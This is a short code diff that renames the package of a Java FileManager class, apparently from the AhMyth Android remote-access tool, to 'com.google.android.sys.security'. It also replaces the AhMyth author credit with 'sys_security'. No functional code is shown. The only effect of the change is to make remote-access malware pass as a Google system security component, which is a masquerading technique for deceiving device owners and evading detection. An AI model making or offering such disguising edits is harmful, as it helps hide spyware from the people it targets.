@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.util.Log;
 
@@ -14,7 +14,7 @@ import java.io.IOException;
 
 
 /**
- * Created by AhMyth on 10/23/16.
+ * Created by sys_security on 10/23/16.
  */
 
 public class FileManager {
